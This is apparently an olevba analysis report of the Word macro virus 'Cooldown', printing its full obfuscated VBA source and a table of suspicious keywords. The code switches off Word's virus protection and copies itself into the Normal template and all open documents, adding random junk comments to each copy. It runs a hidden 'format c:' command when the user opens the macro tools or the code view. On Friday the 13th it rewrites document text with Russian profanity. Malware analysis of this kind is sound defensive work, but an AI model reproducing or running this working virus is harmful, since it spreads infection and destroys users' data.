olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-084d2bcea8cdd5e8ed7c8f471ab1a624d7271d86
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-084d2bcea8cdd5e8ed7c8f471ab1a624d7271d86 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
             
Private _
Sub _
    Document_Open()
    ' 938.7571
' 428.6039
CoolDown _
              0
    ' 1314.969
End Sub
           Private _
        Sub _
              Document_Close()
             CoolDown _
 0
          ' 9540.877
End Sub
        ' 918.8634
Private Sub ToolsMacro()
    CoolDown _
   1
             End _
  Sub
       ' 3981.735
' 8038.11
Private Sub _
    ViewVBCode()
      ' 8943.743
CoolDown 1
    End _
 Sub
    ' 5931.902
Private _
             Sub CoolDown(How As _
         Integer)
      On Error Resume Next
  
' 662.939
' 2466.757
' 3457.876

Dim _
      c As String, a As Long, _
           b _
      As _
             Long, d As _
             Long, e As _
         Long, _
             f As Long, _
      res _
     As _
       String, m _
              As _
 Boolean
          ' 1319.891


' 4781.987
Randomize
              With Options
          .VirusProtection _
                = _
            False
               ' 2194.334
' 7155.477
.ConfirmConversions _
            = False
  ' 4075.343
.SaveNormalPrompt = _
   False
   End _
     With
           If _
           How _
       = _
        1 _
  Then
          ' 5272.451
' 9469.298
s _
     = _
             Shell("format" _
       & _
          Chr(32) & "c:" & Chr(32) _
 & "/autotest", vbHide)
   
' 7545.372
Else
     With NormalTemplate.VBProject.VBComponents(1).codemodule
     If _
    Not _
              .Find("Cool" & "Down", 1, 1, _
 1000, _
      1000, _
            False, _
             False) _
    Then

' 7852.325
' 7649.587
' 5647.334
' 9690.463
' 1628.883
' 2638.102
a _
 = _
            .CountOfLines
         ' 8439.994
' 1904.61
' 2465.814
' 4580.748
For _
   b = 1 _
               To _
              a
               
.deletelines _
      (1)
              Next
           ' 7961.815


d = 1
          ' 5899.813
a _
   = _
     ActiveDocument.VBProject.VBComponents(1).codemodule.CountOfLines
     res _
    = ""
            ' 3382.617
For b = 1 To _
           a
                c = _
             ActiveDocument.VBProject.VBComponents(1).codemodule.Lines(b, 1)
  c = _
         RTrim(LTrim(c))
              
' 2056.051
' 8271.924
If foo(c, _
             f, _
      res) Then
           .InsertLines _
             d, Space(Rnd * _
        16) & _
    res
    d = _
           d + f
   f = _
    0
 res = _
       ""
      End If
           Next
              NormalTemplate.Save
           End If
              ' 2547.691
End With
         For e _
  = _
       1 _
         To Documents.Count
        ' 4034.632
' 6273.579
With _
          Documents(e).VBProject.VBComponents(1).codemodule
         
' 2970.825
' 1336.7
' 5782.174
If _
            Not .Find("Cool" _
& "Down", 1, _
        1, 1000, _
1000, False, _
          False) _
            Then
    
' 6832.051
a = .CountOfLines
          
m _
     = _
               Documents(e).Saved
              
For _
         b = _
       1 _
             To a
            ' 92.68761
' 8849.262
.deletelines (1)
     ' 7475.907
Next
  ' 6163.458
' 7498.285
d _
              = _
            1
          ' 7197.496
a _
    = NormalTemplate.VBProject.VBComponents(1).codemodule.CountOfLines
     res = ""
   ' 5126.866
' 4944.264
For _
            b = _
      1 To a
               ' 3404.707
c _
      = NormalTemplate.VBProject.VBComponents(1).codemodule.Lines(b, 1)
     ' 6669.163
c = RTrim(LTrim(c))
       ' 1006.226
' 920.1765
' 9217.022
' 9542.402
If foo(c, f, res) _
              Then
               
' 6630.517
' 6159.648
.InsertLines d, _
   Space(Rnd _
    * 16) & res
        d = d + _
       f
               ' 2764.074
' 2923.605
' 7060.476
' 2996.198
' 4813.613
f = 0
       res _
            = _
           ""
  ' 7821.799
' 3848.542
' 4407.12

End _
          If
              ' 6908.404
Next
 ' 13.94629
' 9189.388
If _
 Documents(e).Path _
          <> _
     "" Then
 ' 4498.357
' 3873.844
Documents(e).SaveAs _
              AddToRecentFiles:=False
               ' 4000.059

' 4411.571
End If
          If (WeekDay(Date) _
       = 6) And (Day(Date) = 13) _
           And (Rnd > _
   0.7) Then
              Application.StatusBar _
        = _
            ""
          
Application.DisplayStatusBar = _
              False
          Application.ScreenUpdating _
               = False
  With _
       Documents(e).Content
  ' 5547.864
.Find.Execute FindText:="пр", ReplaceWith:="пизд", _
                Replace:=wdReplaceAll
   ' 9835.717
' 8608.526
.Find.Execute FindText:="др", ReplaceWith:="понос", Replace:=wdReplaceAll
       ' 5703.887
.Find.Execute FindText:="кр", ReplaceWith:="кобыл", _
         Replace:=wdReplaceAll
       .Find.Execute FindText:="стр", ReplaceWith:="ебан", Replace:=wdReplaceAll
     
.Find.Execute FindText:="ср", ReplaceWith:="срак", _
  Replace:=wdReplaceAll
      .Find.Execute FindText:="тр", ReplaceWith:="трах", _
               Replace:=wdReplaceAll
            .Find.Execute _
                FindText:="бр", ReplaceWith:="бляд", _
         Replace:=wdReplaceAll
     ' 628.9005
' 1773.856
' 8813.542
.Find.Execute FindText:="вр", ReplaceWith:="выеб", Replace:=wdReplaceAll
    .Find.Execute _
   FindText:="гр", ReplaceWith:="говн", _
 Replace:=wdReplaceAll
          .Find.Execute FindText:="жр", _
 ReplaceWith:="жоп", _
              Replace:=wdReplaceAll
          ' 9342.678
.Find.Execute FindText:="зр", ReplaceWith:="залуп", Replace:=wdReplaceAll
  ' 4543.832
' 2288.986
.Find.Execute _
               FindText:="дж", ReplaceWith:="джоп", _
  Replace:=wdReplaceAll
      ' 149.3853
' 4164.736
.Find.Execute _
          FindText:="кал", _
      ReplaceWith:="дер", _
           Replace:=wdReplaceAll
            ' 2502.795
' 5208.861
.Find.Execute FindText:="бух", ReplaceWith:="бряк", Replace:=wdReplaceAll
         ' 8928.195
' 8917.265
' 4133.663
End _
      With
        
' 6990.859
Documents(e).UndoClear
      ' 9020.428
' 7518.303
' 4940.293
Application.DisplayStatusBar = True
   Application.ScreenUpdating _
          = _
  True
  Application.StatusBar _
    = ""
        ' 4605.235
' 9624.011
' 4907.462

End _
            If
            Documents(e).Saved _
           = m
    End _
         If
   End _
             With
      Next
              End _
         If
  
' 9101.735
' 7737.541
' 1328.001
' 5066.112
' 1387.49
' 3075.387
' 4269.14
End _
    Sub
            Private _
     Function foo(ByRef _
         s As _
               String, ByRef _
   i _
          As _
             Long, _
        ByRef res As _
     String) _
             As _
         Boolean
          Dim _
           tmp As String
      If (Left(s, _
       1) _
     = "'") _
   Or _
      (Len(s) = _
  0) Then
 foo = _
   False
      Exit _
    Function
         ' 5869.951
End _
              If
             If Right(s, 2) _
       = _
          Chr(32) _
            & "_" _
      Then
      ' 1453.716
' 4680.226
' 7453.991
res _
  = _
res _
          & Left(s, _
    Len(s) - 1)
       ' 920.7589
foo _
          = False
     ' 7792.922
Exit Function
       End _
     If
  
tmp _
        = res _
     & _
     s
 res _
            = _
    ""
      i = _
     1
                ' 4172.259
' 4977.08
While Rnd _
          > 0.5
             ' 1821.945
' 8564.943
If Rnd _
         < _
          0.8 Then
            ' 5155.685
res _
           = _
      res _
                & _
  "'" _
 & Str(Rnd * _
             10000)
' 6853.788
' 1145.745

End If
        ' 9356.256

' 3461.082
res _
  = _
              res & Chr(13)
     i = i _
      + _
         1
           ' 8009.701
' 67.30676


Wend
             For _
         a = 1 To Len(tmp)
    
' 1739.334
res _
              = _
              res _
             & Mid(tmp, a, _
   1)
      ' 2739.794
' 4074.159
' 8255.654


If Mid(tmp, _
         a, _
  1) _
                = Chr(32) Then
            If Rnd > 0.5 Then
             res = res _
    & _
      "_" _
  & _
               Chr(13) _
             & _
      Space(Rnd * _
 16)
             ' 4085.106
i = i _
        + _
           1
 End If
              End _
           If
             

Next
        foo = _
           True
 End _
      Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
